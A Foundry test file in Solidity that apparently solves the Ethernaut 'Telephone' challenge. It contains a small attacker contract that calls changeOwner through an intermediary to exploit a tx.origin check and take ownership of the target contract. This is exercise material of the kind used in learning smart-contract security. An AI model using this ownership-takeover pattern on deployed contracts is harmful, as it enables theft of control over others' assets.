// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneAttack {
    function exploit(Telephone tp) public {
        tp.changeOwner(msg.sender);
    }
}

contract TelephoneTest is Test {
    Telephone public tp;
    TelephoneAttack public tpAttack;

    address alice = address(1);

    function setUp() public {
        tp = new Telephone();
        tpAttack = new TelephoneAttack();
    }

    function testAttack() public {
        vm.prank(alice);
        tpAttack.exploit(tp);

        assertEq(tp.owner(), alice);
    }
}
